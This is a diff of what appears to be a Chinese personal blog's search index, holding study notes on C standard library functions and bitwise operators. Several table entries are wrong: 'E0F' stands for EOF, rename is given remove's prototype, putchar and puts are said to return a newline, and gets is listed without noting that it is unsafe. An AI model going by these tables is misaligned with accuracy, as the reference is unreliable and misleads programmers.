+<td>实际输出的字符数</td>
+</tr>
+<tr>
+<td>fputc</td>
+<td>int putc(char ch,FILE * fp)</td>
+<td>将字符ch输出到fp所指的文件中</td>
+<td>成功返回该字符，出错返回E0F</td>
+</tr>
+<tr>
+<td>fputs</td>
+<td>int fputs(char str,FILE * fp)</td>
+<td>将str指定的字符串输出到fp所指的文件中</td>
+<td>成功则返回0，出错则返回E0F</td>
+</tr>
+<tr>
+<td>fread</td>
+<td>int fread(char *pt, unsigned size,unsigned n,FILE * fp)</td>
+<td>从fp所定文件中读取长度为size的n个数据项，存放到pt所指向的内存区</td>
+<td>返回所读的数据项个数，若文件结束或出错返回0</td>
+</tr>
+<tr>
+<td>fscanf</td>
+<td>int fscanf(FILE * fp,char *format,args,…)</td>
+<td>从fp指定的文件中按给定的format格式将读入的数据送到args所指向的内存变量中(args是指针)</td>
+<td>输入的数据个数</td>
+</tr>
+<tr>
+<td>fseek</td>
+<td>int fseek(FILE * fp,long offset,int base)</td>
+<td>将fp指定的文件的位置指针移到base所指出的位置为基准，以offset为位移量的位置</td>
+<td>返回当前位置，否则返回-1</td>
+</tr>
+<tr>
+<td>ftell</td>
+<td>long ftell(FILE * fp)</td>
+<td>返回fp所指定的文件中的读写位置</td>
+<td>返回文件中的读写位置，否则返回0</td>
+</tr>
+<tr>
+<td>fwrite</td>
+<td>int fwrite(char *ptr,unsigned size,unsigned n,FILE * fp)</td>
+<td>把ptr所指向的的n * size个字节输出到fp所指向的文件中</td>
+<td>写到fp文件中的数据项的个数</td>
+</tr>
+<tr>
+<td>getc</td>
+<td>int getc(FILE * fp)</td>
+<td>从fp所指向的文件中的独处下一个字符</td>
+<td>返回读出的字符，若文件出错或结束返回E0F</td>
+</tr>
+<tr>
+<td>getchar</td>
+<td>int getchar()</td>
+<td>从标准输入设备中读取下一个字符</td>
+<td>返回字符，若文件出错或结束返回-1</td>
+</tr>
+<tr>
+<td>gets</td>
+<td>char *gets(char *str)</td>
+<td>从标准输入设备中读取字符串存入str指向的数组</td>
+<td>成功返回str，否则返回NULL</td>
+</tr>
+<tr>
+<td>open</td>
+<td>int open(char *filename, int mode)</td>
+<td>以mode指定的方式打开已存在的名为filename的文件（非ANSI标准）</td>
+<td>返回文件号（正数），如打开失败返回-1</td>
+</tr>
+<tr>
+<td>printf</td>
+<td>int printf(char *format,args,…)</td>
+<td>在format指定的字符串的控制下，将输出列表args的指输出到标准设备</td>
+<td>输出字符的个数。若出错返回负数</td>
+</tr>
+<tr>
+<td>prtc</td>
+<td>int prtc(int ch,FILE *fp)</td>
+<td>把一个字符ch输入到fp所指的文件中</td>
+<td>输出字符ch，若出错返回E0F</td>
+</tr>
+<tr>
+<td>putchar</td>
+<td>int putchar(char ch)</td>
+<td>把字符ch输出到fp标准输出设备</td>
+<td>返回换行符，若失败返回E0F</td>
+</tr>
+<tr>
+<td>puts</td>
+<td>int puts(char *str)</td>
+<td>把str指向的字符串输出到标准输入设备，将”/0”转换为回车行</td>
+<td>返回换行符，若失败返回E0F</td>
+</tr>
+<tr>
+<td>putw</td>
+<td>int putw(int w,FILE *fp)</td>
+<td>将一个整数i（即一个字）写到fp所指文件中（非ANSI标准）</td>
+<td>返回读出的字符，若文件出错或结束返回E0F</td>
+</tr>
+<tr>
+<td>read</td>
+<td>int read(int fd,char *buf,unsigned count)</td>
+<td>从文件号fp所指定的文件中读count个字节到buf知识的缓冲区（非ANSI标准）</td>
+<td>返回真正读出的字节个数，如文件结束返回0，出错返回-1</td>
+</tr>
+<tr>
+<td>remove</td>
+<td>int remove(char *fname)</td>
+<td>删除以fname为文件名的文件</td>
+<td>成功返回0，出错返回-1</td>
+</tr>
+<tr>
+<td>rename</td>
+<td>int remove(char *oname,char *nname)</td>
+<td>把oname所指的文件名改为y由nname所指的文件名</td>
+<td>成功返回0，出错返回-1</td>
+</tr>
+<tr>
+<td>rewind</td>
+<td>void rewind（FILE *fp)</td>
+<td>将fp指定的文件指针置于文件头，并清除文件结束标志和错误标志</td>
+<td>无</td>
+</tr>
+<tr>
+<td>scanf</td>
+<td>int scanf(char *format,args,…)</td>
+<td>从标准输入设备按format指示的格式字符串规定的格式，输入数据给args所指示的单元，args为指针</td>
+<td>读入并附给args数据个数。如文件结束返回E0F，若出错返回0</td>
+</tr>
+<tr>
+<td>write</td>
+<td>int write(int fd,char *buf,unsigned count)</td>
+<td>从buf指示的缓冲区输出count个字符到fd所指的文件中（非ANSI标准）</td>
+<td>返回实际输入的字节数，如出错返回-1</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="5-动态储存分配函数"><a href="#5-动态储存分配函数" class="headerlink" title="5.动态储存分配函数"></a><strong>5.动态储存分配函数</strong></h2><ul>
+<li>在使用动态储存分配函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c">include <span class="token operator">&lt;</span>stdib<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>函数原型</th>
+<th>功能</th>
+<th>返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>calloc</td>
+<td>void *calloc(unsigned n,unsigned size)</td>
+<td>分配n个数据项的内存连续空间，每个数据项的大小为size</td>
+<td>分配内存单元的起始地址。如不成功返回0</td>
+</tr>
+<tr>
+<td>free</td>
+<td>void free(void *p)</td>
+<td>释放p所指的内存区</td>
+<td>无</td>
+</tr>
+<tr>
+<td>malloc</td>
+<td>void *malloc(unsigned size)</td>
+<td>分配size字节的内存区</td>
+<td>所分配的内存区地址如内存不够，返回0</td>
+</tr>
+<tr>
+<td>realloc</td>
+<td>void *realloc(void *p,unsigned size)</td>
+<td>将p所指的以分配的内存区的大小改为size。size可比原来的空间大或小</td>
+<td>返回指向该内存区的指针。若重新分配失败，则返回NULL</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<hr>
+<h2 id="6-其他函数"><a href="#6-其他函数" class="headerlink" title="6.其他函数"></a><strong>6.其他函数</strong></h2><ul>
+<li>在使用这些函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></code></pre>
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>函数原型</th>
+<th>功能</th>
+<th>返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>abs</td>
+<td>int abs(int num)</td>
+<td>计算整数num的绝对值</td>
+<td>返回计算结果</td>
+</tr>
+<tr>
+<td>atof</td>
+<td>double atof(char *str)</td>
+<td>将str指向的字符串转换为一个double型的指</td>
+<td>返回双精度计算结果</td>
+</tr>
+<tr>
+<td>atoi</td>
+<td>int atoi(char *str)</td>
+<td>将str指向的字符串转换为int型的值</td>
+<td>返回转换结果</td>
+</tr>
+<tr>
+<td>atol</td>
+<td>long atol(cahr *str)</td>
+<td>将str指向的字符串转换为一个long型的值</td>
+<td>返回转换结果</td>
+</tr>
+<tr>
+<td>exit</td>
+<td>void exit(int status)</td>
+<td>中止程序运行。将status的值返回调用的过程</td>
+<td>无</td>
+</tr>
+<tr>
+<td>itoa</td>
+<td>char *itoa(int n,char *str,int radix)</td>
+<td>将整数n的值按照radix进制转换为等价的字符串，并将结果存入str指向的字符串中</td>
+<td>返回一个指向str的指针</td>
+</tr>
+<tr>
+<td>labs</td>
+<td>long labs（long num）</td>
+<td>计算long型的整数num的绝对值</td>
+<td>返回计算结果</td>
+</tr>
+<tr>
+<td>ltoa</td>
+<td>char *ltoa(long n,char *str,int radix)</td>
+<td>将长整数n的值按照radix进制转换为等价的字符串，并将结果存入str指向的字符串</td>
+<td>返回一个指向str的指针</td>
+</tr>
+<tr>
+<td>rand</td>
+<td>int rand()</td>
+<td>产生0到RAND_MAX之间的伪随机数。RAND_MAX在头文件中定义(头文件为time.h)</td>
+<td>返回一个伪随机（整）数</td>
+</tr>
+<tr>
+<td>random</td>
+<td>int random（int num）</td>
+<td>产生0到num之间的随机数(头文件为time.h)</td>
+<td>返回一个随机（整）数</td>
+</tr>
+<tr>
+<td>randomize</td>
+<td>void randomize()</td>
+<td>初始化随机函数，使用时包括头文件time.h</td>
+<td></td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>编程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C语言学习笔记</title>
     <url>/2020/05/05/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="C语言学习笔记"><a href="#C语言学习笔记" class="headerlink" title="C语言学习笔记"></a>C语言学习笔记</h1><hr>
@@ -1579,114 +2323,6 @@ p <span class="token operator">=</span> <span class="token operator">&amp;</span
 ]]></content>
   </entry>
   <entry>
-    <title>C语言位运算符学习</title>
-    <url>/2019/10/26/C%E8%AF%AD%E8%A8%80%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
-    <content><![CDATA[<h1 id="C语言运算符"><a href="#C语言运算符" class="headerlink" title="C语言运算符"></a>C语言运算符</h1><p>[Toc]</p>
-<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a><strong>概念</strong></h2><ul>
-<li>位运算是指按二进制进行的运算。</li>
-<li>C语言提供了6个位操作运算符。这些运算符只能用于整型操作数，即只能用于带符号或无符号的char,short,int与long类型。</li>
-</ul>
-<a id="more"></a>
-
-<p>======================================</p>
-<h2 id="C语言提供的位运算符列表"><a href="#C语言提供的位运算符列表" class="headerlink" title="C语言提供的位运算符列表"></a><strong>C语言提供的位运算符列表</strong></h2><table>
-<thead>
-<tr>
-<th>运算符</th>
-<th>含义</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&amp;</td>
-<td>按位与</td>
-<td>如果两个相应的二进制位都为1，则该位的结果值为1，否则为0</td>
-</tr>
-<tr>
-<td>l</td>
-<td>按位或</td>
-<td>两个相应的二进制位中只要有一个为1，该位的结果值为1</td>
-</tr>
-<tr>
-<td>^</td>
-<td>按位异或</td>
-<td>若参加运算的两个二进制位值相同则为0，否则为1</td>
-</tr>
-<tr>
-<td>~</td>
-<td>取反</td>
-<td>~是一元运算符，用来对一个二进制数按位取反，即将0变1，将1变0</td>
-</tr>
-<tr>
-<td>&lt;&lt;</td>
-<td>左移</td>
-<td>用来将一个数的各二进制位全部左移N位，右补0</td>
-</tr>
-<tr>
-<td>&gt;&gt;</td>
-<td>右移</td>
-<td>将一个数的各二进制位右移N位，移到右端的低位被舍弃，对于无符号数，高位补0</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="按位与运算符"><a href="#按位与运算符" class="headerlink" title="按位与运算符"></a><strong>按位与运算符</strong></h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><ul>
-<li>按位与是指：参加运算的两个数据，按二进制位进行“与”运算。如果两个相应的二进制位都为１，则该位的结果值为1；否则为0。</li>
-<li>按位与其实与逻辑上“与”的运算规则一致。逻辑上的“与”，要求运算数全真，结果才为真。若，A=true,B=true,则A∩B=true </li>
-<li>例如：3&amp;5 3的二进制编码是11(2)。（为了区分十进制和其他进制，凡是非十进制的数据均在数据后面加上括号，括号中注明其进制，二进制则标记为2）内存储存数据的基本单位是字节（Byte），一个字节由8个位（bit)所组成。位是用以描述电脑数据量的最小单位。二进制系统中，每个0或1就是一个位。将11（2）补足成一个字节，则是00000011（2）。5的二进制编码是101（2），将其补足成一个字节，则是00000101（2）</li>
-</ul>
-<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>1）清零</p>
-<p>若想对一个存储单元清零，即使其全部二进制位为0，只要找一个二进制数</p>
-<blockquote>
-<p>原来的数中为1的位，新数中相应位为0。然后使二者进行&amp;运算，即可达到清零目的</p>
-</blockquote>
-<p>2）取一个数中某些指定位</p>
-<p>若有一个整数a(2byte),想要取其中的低字节，只需要将a与8个1按位与即可</p>
-<p>3）保留指定位：</p>
-<p>与一个数进行“按位与”运算，此数在该位取1.</p>
-<hr>
-<hr>
-<h2 id="按位或运算符"><a href="#按位或运算符" class="headerlink" title="按位或运算符"></a><strong>按位或运算符</strong></h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><ul>
-<li>两个相应的二进制位中只要有一个为1，该位的结果值为1。</li>
-</ul>
-<hr>
-<hr>
-<h2 id="异或运算符"><a href="#异或运算符" class="headerlink" title="异或运算符"></a><strong>异或运算符</strong></h2><ul>
-<li>1.使特定位翻转</li>
-<li>2.保留原值（与0相异或）</li>
-<li>3.交换两个值不用临时变量</li>
-</ul>
-<hr>
-<hr>
-<h2 id="取反运算符"><a href="#取反运算符" class="headerlink" title="取反运算符"></a><strong>取反运算符</strong></h2><ul>
-<li>用于求整数的二进制反码，即分别将操作数各二进制位上的1变为0，0变为1。</li>
-</ul>
-<hr>
-<hr>
-<h2 id="左移运算符"><a href="#左移运算符" class="headerlink" title="左移运算符"></a><strong>左移运算符</strong></h2><ul>
-<li>左移运算符是用来将一个数的各二进制位左移若干位，移动的位数由右操作数指定（右操作数必须是非负值），其右边空出的位用0填补，高位左移溢出则舍弃该高位。</li>
-</ul>
-<hr>
-<hr>
-<h2 id="右移运算符"><a href="#右移运算符" class="headerlink" title="右移运算符"></a><strong>右移运算符</strong></h2><ul>
-<li>右移运算符是用来将一个数的各二进制位右移若干位，移动的位数由右操作数指定（右操作数必须是非负<br>值），移到右端的低位被舍弃，</li>
-<li>对于无符号数，高位补0。</li>
-<li>对于有符号数，某些机器将对左边空出的部分<br>用符号位填补（即“算术移位”），而另一些机器则对左边空出的部分用0填补（即“逻辑移位”）。</li>
-<li>注意：对无符号数,右移时左边高位移入0；对于有符号的值,如果原来符号位为0(该数为正),则左边也是移入0。如果符号位原来为1(即负数),则左边移入0还是1,要取决于所用的计算机系统。有的系统移入0,有的系统移入1。移入0的称为“逻辑移位”,即简单移位；移入1的称为“算术移位”。</li>
-</ul>
-<hr>
-<hr>
-<h2 id="位运算赋值运算符"><a href="#位运算赋值运算符" class="headerlink" title="位运算赋值运算符"></a><strong>位运算赋值运算符</strong></h2><ul>
-<li>位运算符与赋值运算符可以组成复合赋值运算符。</li>
-</ul>
-<blockquote>
-<p>例如: &amp;=, |=, &gt;&gt;=, &lt;&lt;=, ∧=</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>编程</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello</title>
     <url>/2019/10/25/Hello/</url>
     <content><![CDATA[<h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I"></a>Who am I</h2><p><font color="green">你好，我是九九，ID：Doublenine。来自GDUT<br></font></p>
@@ -1696,754 +2332,6 @@ p <span class="token operator">=</span> <span class="token operator">&amp;</span
 <hr>
 <p><strong>希望你能多多支持我！</strong></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>C语言库函数学习</title>
-    <url>/2019/10/26/C%E8%AF%AD%E8%A8%80%E5%BA%93%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="C语言库函数"><a href="#C语言库函数" class="headerlink" title="C语言库函数"></a>C语言库函数</h1><p>[Toc]</p>
-<h2 id="1-数学函数"><a href="#1-数学函数" class="headerlink" title="1.数学函数"></a><strong>1.数学函数</strong></h2><ul>
-<li>使用数学函数时，应在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;math.h></span> </span></code></pre>
-</li>
-</ul>
-<a id="more"></a>
-
-<table>
-<thead>
-<tr>
-<th>函数名</th>
-<th>函数原型</th>
-<th>功能</th>
-<th>返回值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>acos</td>
-<td>double acos(double x)</td>
-<td>计算arccos x的值，其中-1&lt;=x&lt;=1</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>asin</td>
-<td>double asin(double x)</td>
-<td>计算arcsin x的值，其中-1&lt;=x&lt;=1</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>atan</td>
-<td>double atan(double x)</td>
-<td>计算arctan x的值</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>atan2</td>
-<td>double atan2(double x,double y)</td>
-<td>计算arctan x/y的值</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>cos</td>
-<td>double cos(double x)</td>
-<td>计算cos x的值,其中x的单位为弧度</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>cosh</td>
-<td>double cosh(double x)</td>
-<td>计算x的双曲余弦cosh x的值</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>exp</td>
-<td>double exp(double x)</td>
-<td>求e^x的值</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>fabs</td>
-<td>double fabs(double x)</td>
-<td>求x的绝对值</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>floor</td>
-<td>double floor(double x)</td>
-<td>求出不大于x的最大整数</td>
-<td>该整数的双精度实数</td>
-</tr>
-<tr>
-<td>fmod</td>
-<td>double fmod(double x,double y);</td>
-<td>求整除x/y的余数</td>
-<td>返回余数的双精度实数</td>
-</tr>
-<tr>
-<td>frexp</td>
-<td>double frexp(double val,int *eptr)</td>
-<td>把双精度数val分解成数字部分(尾数)和以2为底的指数，即val=x * 2^n,n存放在eptr指向的变量中</td>
-<td>数字部分x 0.5 &lt;= x &lt; 1</td>
-</tr>
-<tr>
-<td>log</td>
-<td>double log(double x)</td>
-<td>求ln x的值</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>log10</td>
-<td>double log10(double x)</td>
-<td>求log10x的值</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>modf</td>
-<td>double mof(double val,int * iptr)</td>
-<td>把双精度数val分解成数字部分和小数部分，把整数部分存放在ptr指向的变量中</td>
-<td>val的小数部分</td>
-</tr>
-<tr>
-<td>pow</td>
-<td>double pow(double x,double y)</td>
-<td>求x^y的值</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>sin</td>
-<td>double sin(double x)</td>
-<td>求sin x的值,其中x的单位为弧度</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>sinh</td>
-<td>double sinh(double x)</td>
-<td>计算x的双曲正弦函数sinh x的值</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>sqrt</td>
-<td>double sqrt(double x)</td>
-<td>计算，其中x&gt;=0</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>tan</td>
-<td>double tan(double x)</td>
-<td>计算tan x的值,其中x的单位为弧度</td>
-<td>计算结果</td>
-</tr>
-<tr>
-<td>tanh</td>
-<td>double tanh(double x)</td>
-<td>计算tanh x的值，其中x的单位为弧度</td>
-<td>计算结果</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="2-字符函数"><a href="#2-字符函数" class="headerlink" title="2.字符函数"></a><strong>2.字符函数</strong></h2><ul>
-<li>在使用字符函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span></code></pre>
-<table>
-<thead>
-<tr>
-<th>函数名</th>
-<th>函数原型</th>
-<th>功能</th>
-<th>返回值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>isalnum</td>
-<td>int isalnum(int ch)</td>
-<td>检查ch是否字母或数字</td>
-<td>是则返回1，否则返回0</td>
-</tr>
-<tr>
-<td>isalpha</td>
-<td>int isalpha(int ch)</td>
-<td>检查ch是否为字母</td>
-<td>是字母返回1，否则返回0</td>
-</tr>
-<tr>
-<td>iscntrl</td>
-<td>int iscntrl(int ch)</td>
-<td>检查ch是否控制字符（其ASCII码在0和0xLF之间)</td>
-<td>是控制字符返回1，否则返回0</td>
-</tr>
-<tr>
-<td>isdigit</td>
-<td>int isdigit(int ch)</td>
-<td>检查ch是否为数字</td>
-<td>是数字返回1，否则返回0</td>
-</tr>
-<tr>
-<td>isgraph</td>
-<td>int isgraph(int ch)</td>
-<td>检查ch是否可打印字符（其ASCII码在0x21和0x7e之间），不包括空格</td>
-<td>可打印字符返回1，否则返回0</td>
-</tr>
-<tr>
-<td>islower</td>
-<td>int islower(int ch)</td>
-<td>检查ch是否是小写字母(a~z)</td>
-<td>是小写字母返回1，否则返回0</td>
-</tr>
-<tr>
-<td>isprint</td>
-<td>int print(int ch)</td>
-<td>检查ch是否是可打印字符（其ASCII码在0x21和0x7e之间),不包括空格</td>
-<td>可打印字符返回1，否则返回0</td>
-</tr>
-<tr>
-<td>ispunct</td>
-<td>int ispunct(int ch)</td>
-<td>检查ch是否是标点字符（不包括空格）即除字母、数字和空格以外的所有可打印字符</td>
-<td>是标点返回1，否则返回0</td>
-</tr>
-<tr>
-<td>isspace</td>
-<td>int isspace(int ch)</td>
-<td>检查ch是否空格、制表符或换行符</td>
-<td>是返回1，否则返回0</td>
-</tr>
-<tr>
-<td>isupper</td>
-<td>int isupper(int ch)</td>
-<td>检查ch是否大写字母(A~Z)</td>
-<td>是返回1，否则返回0</td>
-</tr>
-<tr>
-<td>isxdigit</td>
-<td>int isxdigit(int ch)</td>
-<td>检查ch是否一个16进制数字(即0<del>9，或A</del>F,a~f)</td>
-<td>是返回1，否则返回0</td>
-</tr>
-<tr>
-<td>tolower</td>
-<td>int tolower(int ch)</td>
-<td>将ch字符转换为小写字母</td>
-<td>返回ch对应的小写字母</td>
-</tr>
-<tr>
-<td>toupper</td>
-<td>int toupper(int ch)</td>
-<td>将ch字符转换为大写字母</td>
-<td>返回ch对应的大写字母</td>
-</tr>
-</tbody></table>
-</li>
-</ul>
-<hr>
-<h2 id="3-字符串函数"><a href="#3-字符串函数" class="headerlink" title="3.字符串函数"></a><strong>3.字符串函数</strong></h2><ul>
-<li>在使用字符串函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></code></pre>
-<img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538569387148&di=fa4604d28b80f7d5b8031101d952c7c7&imgtype=0&src=http%3A%2F%2Fwww.68idc.cn%2Fhelp%2Fuploads%2Fallimg%2F150116%2F151FMW7_0.jpg" alt></li>
-</ul>
-<hr>
-<h2 id="4-输入输出函数"><a href="#4-输入输出函数" class="headerlink" title="4.输入输出函数"></a><strong>4.输入输出函数</strong></h2><ul>
-<li>在使用输入输出函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></code></pre>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>函数名</th>
-<th>函数原型</th>
-<th>功能</th>
-<th>返回值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>clearerr</td>
-<td>void clearerr(FILE *fp)</td>
-<td>清除文件指针错误提示器</td>
-<td>无</td>
-</tr>
-<tr>
-<td>close</td>
-<td>int close(int fp)</td>
-<td>关闭文件（非ANSI标准)</td>
-<td>关闭成功返回0，不成功返回-1</td>
-</tr>
-<tr>
-<td>creat</td>
-<td>int creat(char*filename,int mode)</td>
-<td>以mode所指定的方式建立文件（非ANSI标准）</td>
-<td>成功返回正数，否则返回-1</td>
-</tr>
-<tr>
-<td>eof</td>
-<td>int eof（int fp)</td>
-<td>判断fp所指的文件是否结束</td>
-<td>文件结束返回1，否则返回0</td>
-</tr>
-<tr>
-<td>fclose</td>
-<td>int fclose（FILE * fp)</td>
-<td>关闭fp所指的文件，释放文件缓冲区</td>
-<td>关闭成功返回0，不成功返回非0</td>
-</tr>
-<tr>
-<td>feof</td>
-<td>int feof(FILE * fp)</td>
-<td>检查文件是否结束</td>
-<td>结束返回非0，否则返回0</td>
-</tr>
-<tr>
-<td>ferror</td>
-<td>int ferror(FILE * fp)</td>
-<td>测试fp所指文件是否错误</td>
-<td>无错返回0，否则返沪非0</td>
-</tr>
-<tr>
-<td>fflush</td>
-<td>int fflush(FILE * fp)</td>
-<td>将fp所指的文件的全部控制信息和数据存盘</td>
-<td>存盘正确返回0，否则返回非0</td>
-</tr>
-<tr>
-<td>fgets</td>
-<td>char *fgets(char *buf,int n,FILE *fp)</td>
-<td>从fp所指的文件读取一个长度为(n-1)的字符串，存入起始地址为buf的空间</td>
-<td>返回地址buf。若遇文件结束或出错则返回E0F</td>
-</tr>
-<tr>
-<td>fopen</td>
-<td>FILE *fopen(char *filename, char *mode)</td>
-<td>以mode指定的方式打开名为filename的文件</td>
-<td>成功，则返回一个文件指针，否则返回0</td>
-</tr>
-<tr>
-<td>fprintf</td>
-<td>int fprintf(FILE * fp, char *format,args,…)</td>
-<td>把args的值以format指定的格式输出到fp所指的文件中</td>
-<td>实际输出的字符数</td>
-</tr>
-<tr>
-<td>fputc</td>
-<td>int putc(char ch,FILE * fp)</td>
-<td>将字符ch输出到fp所指的文件中</td>
-<td>成功返回该字符，出错返回E0F</td>
-</tr>
-<tr>
-<td>fputs</td>
-<td>int fputs(char str,FILE * fp)</td>
-<td>将str指定的字符串输出到fp所指的文件中</td>
-<td>成功则返回0，出错则返回E0F</td>
-</tr>
-<tr>
-<td>fread</td>
-<td>int fread(char *pt, unsigned size,unsigned n,FILE * fp)</td>
-<td>从fp所定文件中读取长度为size的n个数据项，存放到pt所指向的内存区</td>
-<td>返回所读的数据项个数，若文件结束或出错返回0</td>
-</tr>
-<tr>
-<td>fscanf</td>
-<td>int fscanf(FILE * fp,char *format,args,…)</td>
-<td>从fp指定的文件中按给定的format格式将读入的数据送到args所指向的内存变量中(args是指针)</td>
-<td>输入的数据个数</td>
-</tr>
-<tr>
-<td>fseek</td>
-<td>int fseek(FILE * fp,long offset,int base)</td>
-<td>将fp指定的文件的位置指针移到base所指出的位置为基准，以offset为位移量的位置</td>
-<td>返回当前位置，否则返回-1</td>
-</tr>
-<tr>
-<td>ftell</td>
-<td>long ftell(FILE * fp)</td>
-<td>返回fp所指定的文件中的读写位置</td>
-<td>返回文件中的读写位置，否则返回0</td>
-</tr>
-<tr>
-<td>fwrite</td>
-<td>int fwrite(char *ptr,unsigned size,unsigned n,FILE * fp)</td>
-<td>把ptr所指向的的n * size个字节输出到fp所指向的文件中</td>
-<td>写到fp文件中的数据项的个数</td>
-</tr>
-<tr>
-<td>getc</td>
-<td>int getc(FILE * fp)</td>
-<td>从fp所指向的文件中的独处下一个字符</td>
-<td>返回读出的字符，若文件出错或结束返回E0F</td>
-</tr>
-<tr>
-<td>getchar</td>
-<td>int getchar()</td>
-<td>从标准输入设备中读取下一个字符</td>
-<td>返回字符，若文件出错或结束返回-1</td>
-</tr>
-<tr>
-<td>gets</td>
-<td>char *gets(char *str)</td>
-<td>从标准输入设备中读取字符串存入str指向的数组</td>
-<td>成功返回str，否则返回NULL</td>
-</tr>
-<tr>
-<td>open</td>
-<td>int open(char *filename, int mode)</td>
-<td>以mode指定的方式打开已存在的名为filename的文件（非ANSI标准）</td>
-<td>返回文件号（正数），如打开失败返回-1</td>
-</tr>
-<tr>
-<td>printf</td>
-<td>int printf(char *format,args,…)</td>
-<td>在format指定的字符串的控制下，将输出列表args的指输出到标准设备</td>
-<td>输出字符的个数。若出错返回负数</td>
-</tr>
-<tr>
-<td>prtc</td>
-<td>int prtc(int ch,FILE *fp)</td>
-<td>把一个字符ch输入到fp所指的文件中</td>
-<td>输出字符ch，若出错返回E0F</td>
-</tr>
-<tr>
-<td>putchar</td>
-<td>int putchar(char ch)</td>
-<td>把字符ch输出到fp标准输出设备</td>
-<td>返回换行符，若失败返回E0F</td>
-</tr>
-<tr>
-<td>puts</td>
-<td>int puts(char *str)</td>
-<td>把str指向的字符串输出到标准输入设备，将”/0”转换为回车行</td>
-<td>返回换行符，若失败返回E0F</td>
-</tr>
-<tr>
-<td>putw</td>
-<td>int putw(int w,FILE *fp)</td>
-<td>将一个整数i（即一个字）写到fp所指文件中（非ANSI标准）</td>
-<td>返回读出的字符，若文件出错或结束返回E0F</td>
-</tr>
-<tr>
-<td>read</td>
-<td>int read(int fd,char *buf,unsigned count)</td>
-<td>从文件号fp所指定的文件中读count个字节到buf知识的缓冲区（非ANSI标准）</td>
-<td>返回真正读出的字节个数，如文件结束返回0，出错返回-1</td>
-</tr>
-<tr>
-<td>remove</td>
-<td>int remove(char *fname)</td>
-<td>删除以fname为文件名的文件</td>
-<td>成功返回0，出错返回-1</td>
-</tr>
-<tr>
-<td>rename</td>
-<td>int remove(char *oname,char *nname)</td>
-<td>把oname所指的文件名改为y由nname所指的文件名</td>
-<td>成功返回0，出错返回-1</td>
-</tr>
-<tr>
-<td>rewind</td>
-<td>void rewind（FILE *fp)</td>
-<td>将fp指定的文件指针置于文件头，并清除文件结束标志和错误标志</td>
-<td>无</td>
-</tr>
-<tr>
-<td>scanf</td>
-<td>int scanf(char *format,args,…)</td>
-<td>从标准输入设备按format指示的格式字符串规定的格式，输入数据给args所指示的单元，args为指针</td>
-<td>读入并附给args数据个数。如文件结束返回E0F，若出错返回0</td>
-</tr>
-<tr>
-<td>write</td>
-<td>int write(int fd,char *buf,unsigned count)</td>
-<td>从buf指示的缓冲区输出count个字符到fd所指的文件中（非ANSI标准）</td>
-<td>返回实际输入的字节数，如出错返回-1</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="5-动态储存分配函数"><a href="#5-动态储存分配函数" class="headerlink" title="5.动态储存分配函数"></a><strong>5.动态储存分配函数</strong></h2><ul>
-<li>在使用动态储存分配函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c">include <span class="token operator">&lt;</span>stdib<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
-<table>
-<thead>
-<tr>
-<th>函数名</th>
-<th>函数原型</th>
-<th>功能</th>
-<th>返回值</th>
